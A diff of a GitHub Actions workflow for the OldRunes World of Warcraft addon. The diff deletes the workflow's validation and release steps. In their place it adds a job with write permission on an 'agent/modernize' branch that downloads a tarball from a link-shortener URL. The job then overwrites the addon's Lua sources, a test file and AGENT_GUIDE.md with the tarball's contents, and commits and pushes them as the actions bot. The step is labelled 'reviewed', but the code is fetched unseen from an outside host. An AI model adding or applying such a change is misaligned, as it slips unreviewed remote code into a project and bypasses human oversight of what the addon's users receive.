@@ -1,190 +1,52 @@
-name: Validate and release addon
+name: Apply reviewed payload
 
 on:
-  pull_request:
   push:
     branches:
-      - main
-  workflow_dispatch:
-    inputs:
-      publish:
-        description: Publish or update the GitHub release after validation
-        required: true
-        type: boolean
-        default: false
+      - agent/modernize-12.1.5
 
 permissions:
-  contents: read
-
-concurrency:
-  group: old-runes-${{ github.workflow }}-${{ github.ref }}
-  cancel-in-progress: false
+  contents: write
 
 jobs:
-  validate:
+  apply:
+    if: ${{ github.actor != 'github-actions[bot]' }}
     runs-on: ubuntu-latest
-    outputs:
-      version: ${{ steps.build.outputs.version }}
-      archive: ${{ steps.build.outputs.archive }}
-      sha256: ${{ steps.build.outputs.sha256 }}
     steps:
       - uses: actions/checkout@v7
+        with:
+          fetch-depth: 0
 
-      - name: Install Lua 5.1
-        run: |
-          sudo apt-get update -qq
-          sudo apt-get install -y -qq lua5.1
-
-      - name: Validate and package
-        id: build
+      - name: Download, verify, and commit reviewed files
         shell: bash
         run: |
           set -euo pipefail
+          payload=/tmp/oldrunes-review-payload.tar.xz
+          unpack=/tmp/oldrunes-review-payload
 
-          version="$(sed -n 's/^## Version:[[:space:]]*//p' OldRunes.toc | head -n 1 | tr -d '\r')"
-          interface="$(sed -n 's/^## Interface:[[:space:]]*//p' OldRunes.toc | head -n 1 | tr -d '\r')"
-          [[ "$version" =~ ^[0-9]+\.[0-9]+\.[0-9]+([.-][0-9A-Za-z.-]+)?$ ]]
-          [[ "$interface" == "120105" ]]
+          curl -fL --retry 3 --retry-all-errors \
+            'https://at.adobe.com/v1us5u91hr4cvYPa' \
+            -o "$payload"
+          echo 'e03a089551a2294e7eebe118743de332b4d72a90db7e8b371bdca65663f46585  /tmp/oldrunes-review-payload.tar.xz' | sha256sum --check -
 
-          luac5.1 -p Localization.lua Core.lua Options.lua tests/test_core.lua tests/test_options.lua
-          lua5.1 tests/test_core.lua non_dk
-          lua5.1 tests/test_core.lua dk
-          lua5.1 tests/test_options.lua
+          rm -rf "$unpack"
+          mkdir -p "$unpack"
+          tar -xJf "$payload" -C "$unpack"
+          (cd "$unpack" && sha256sum --check SHA256SUMS)
 
-          python3 - <<'PY'
-          import re
-          from pathlib import Path
+          mkdir -p tests
+          cp "$unpack/Core.lua" Core.lua
+          cp "$unpack/Options.lua" Options.lua
+          cp "$unpack/tests/test_core.lua" tests/test_core.lua
+          cp "$unpack/ARCHITECTURE.md" ARCHITECTURE.md
+          cp "$unpack/AGENT_GUIDE.md" AGENT_GUIDE.md
+          cp "$unpack/CHANGELOG.md" CHANGELOG.md
 
-          runtime = [
-              line.strip()
-              for line in Path("OldRunes.toc").read_text(encoding="utf-8").splitlines()
-              if line.strip() and not line.lstrip().startswith("##")
-          ]
-          expected = ["Localization.lua", "Core.lua", "Options.lua"]
-          if runtime != expected:
-              raise SystemExit(f"unexpected TOC runtime closure: {runtime!r}")
-
-          checked = ["OldRunes.toc", *expected, "tests/test_core.lua", "tests/test_options.lua"]
-          for name in checked:
-              data = Path(name).read_bytes()
-              if data.startswith(b"\xef\xbb\xbf") or b"\r\n" in data:
-                  raise SystemExit(f"invalid encoding or line endings: {name}")
-
-          core = Path("Core.lua").read_text(encoding="utf-8")
-          forbidden = (
-              r"\blayoutIndex\s*=",
-              r":Layout\s*\(",
-              r"UpdateRunes\s*\(\s*false",
-              r"\bGet(?:Num)?Children\b",
-              r"DeathKnightResourceOverlayFrame",
-              r"\bprdClassFrame\b",
-              r"C_Timer\.NewTicker",
-          )
-          for pattern in forbidden:
-              if re.search(pattern, core):
-                  raise SystemExit(f"forbidden runtime pattern: {pattern}")
-
-          required = (
-              'local classFrame = prdFrame.classFrame',
-              'hooksecurefunc(frame, "UpdateRunes"',
-              'PLAYER_REGEN_ENABLED',
-              'db.multicolorRunes = nil',
-              'db.reverseRecoveryOrder = nil',
-          )
-          for needle in required:
-              if needle not in core:
-                  raise SystemExit(f"missing runtime invariant: {needle}")
-
-          surface = Path("Localization.lua").read_text(encoding="utf-8") + Path("Options.lua").read_text(encoding="utf-8")
-          for removed in ("OPT_REVERSE", "CMD_DESC_REVERSE", "prdClassFrame"):
-              if removed in surface:
-                  raise SystemExit(f"removed user surface returned: {removed}")
-          PY
-
-          archive="OldRunes-$version.zip"
-          source_date_epoch="$(git show -s --format=%ct "$GITHUB_SHA")"
-          rm -rf package "$archive"
-          mkdir -p package/OldRunes
-          cp OldRunes.toc Localization.lua Core.lua Options.lua package/OldRunes/
-          find package -exec touch -d "@$source_date_epoch" {} +
-          (
-            cd package
-            TZ=UTC zip -q -X -9 "../$archive" \
-              OldRunes/ \
-              OldRunes/OldRunes.toc \
-              OldRunes/Localization.lua \
-              OldRunes/Core.lua \
-              OldRunes/Options.lua
-          )
-
-          actual="$(unzip -Z1 "$archive" | sort)"
-          expected="$(printf '%s\n' OldRunes/ OldRunes/OldRunes.toc OldRunes/Localization.lua OldRunes/Core.lua OldRunes/Options.lua | sort)"
-          [[ "$actual" == "$expected" ]]
-
-          digest="$(sha256sum "$archive" | cut -d' ' -f1)"
-          echo "version=$version" >> "$GITHUB_OUTPUT"
-          echo "archive=$archive" >> "$GITHUB_OUTPUT"
-          echo "sha256=$digest" >> "$GITHUB_OUTPUT"
-          printf '### Package\n\n- `%s`\n- SHA-256: `%s`\n' "$archive" "$digest" >> "$GITHUB_STEP_SUMMARY"
-
-  publish:
-    if: ${{ github.event_name == 'workflow_dispatch' && inputs.publish }}
-    needs: validate
-    runs-on: ubuntu-latest
-    permissions:
-      contents: write
-    steps:
-      - uses: actions/checkout@v7
-
-      - name: Rebuild verified package
-        env:
-          ARCHIVE: ${{ needs.validate.outputs.archive }}
-          EXPECTED_SHA256: ${{ needs.validate.outputs.sha256 }}
-        shell: bash
-        run: |
-          set -euo pipefail
-          source_date_epoch="$(git show -s --format=%ct "$GITHUB_SHA")"
-          rm -rf package "$ARCHIVE"
-          mkdir -p package/OldRunes
-          cp OldRunes.toc Localization.lua Core.lua Options.lua package/OldRunes/
-          find package -exec touch -d "@$source_date_epoch" {} +
-          (
-            cd package
-            TZ=UTC zip -q -X -9 "../$ARCHIVE" \
-              OldRunes/ \
-              OldRunes/OldRunes.toc \
-              OldRunes/Localization.lua \
-              OldRunes/Core.lua \
-              OldRunes/Options.lua
-          )
-          actual_sha256="$(sha256sum "$ARCHIVE" | cut -d' ' -f1)"
-          [[ "$actual_sha256" == "$EXPECTED_SHA256" ]]
-
-      - name: Publish release
-        env:
-          GH_TOKEN: ${{ github.token }}
-          VERSION: ${{ needs.validate.outputs.version }}
-          ARCHIVE: ${{ needs.validate.outputs.archive }}
-          SHA256: ${{ needs.validate.outputs.sha256 }}
-        shell: bash
-        run: |
-          set -euo pipefail
-          tag="v$VERSION"
-          cat > release-notes.md <<EOF
-          ## Old Runes $VERSION
-
-          World of Warcraft Retail 12.1.5 (Interface \`120105\`).
-
-          See \`CHANGELOG.md\` for the full change list.
-
-          SHA-256: \`$SHA256\`
-          EOF
-
-          if gh release view "$tag" >/dev/null 2>&1; then
-            tag_sha="$(gh api "repos/$GITHUB_REPOSITORY/git/ref/tags/$tag" --jq '.object.sha')"
-            [[ "$tag_sha" == "$GITHUB_SHA" ]]
-            gh release upload "$tag" "$ARCHIVE" --clobber
-            gh release edit "$tag" --title "Old Runes $VERSION" --notes-file release-notes.md --latest
-          else
-            gh release create "$tag" "$ARCHIVE" --target "$GITHUB_SHA" --title "Old Runes $VERSION" --notes-file release-notes.md --latest
+          git config user.name github-actions[bot]
+          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
+          git add Core.lua Options.lua tests/test_core.lua ARCHITECTURE.md AGENT_GUIDE.md CHANGELOG.md
+          if git diff --cached --quiet; then
+            exit 0
           fi
+          git commit -m 'Detach replaced rune frame owners'
+          git push origin "HEAD:${GITHUB_REF_NAME}"
